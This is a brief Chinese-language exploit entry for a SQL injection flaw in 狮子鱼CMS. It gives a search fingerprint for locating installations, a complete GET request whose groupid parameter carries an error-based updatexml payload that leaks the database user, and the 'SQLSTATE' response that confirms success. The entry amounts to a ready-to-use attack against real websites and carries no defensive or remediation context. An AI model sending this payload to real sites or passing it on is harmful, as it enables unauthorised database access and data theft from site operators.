# 狮子鱼CMSSQL注入漏洞2

狮子鱼CMS ｜ SQL注入 ｜ —
- **指纹**：`body="/seller.php?s=/Public/login"`
- **请求**：`GET /index.php?s=/Utility/file&do=image&groupid=123)%20or%20updatexml(1,concat(0x7e,user(),0x7e),1)--+ HTTP/1.1`
- **响应特征**：404 SQLSTATE